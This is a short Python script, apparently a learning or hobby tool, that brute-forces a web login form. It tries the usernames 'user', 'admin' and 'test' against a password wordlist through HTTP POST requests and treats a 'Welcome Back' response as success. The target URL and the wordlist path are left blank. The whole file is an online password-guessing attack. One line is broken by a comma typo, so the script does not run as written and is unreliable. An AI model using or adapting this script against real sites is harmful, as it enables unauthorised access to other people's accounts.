import requests
import sys

target = ""
user_names = ["user","admin","test"]
passwords = ""
needle = "Welcome Back"


for username in user_names:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n"),encode()
            sys.stdout.write("[X] Attempting user : password -> {} : {}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] VAlid password '{}' found for user '{}' !".format(password.decode(),username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t No password found found for '{}'".format(username))
        sys.stdout.write("\n")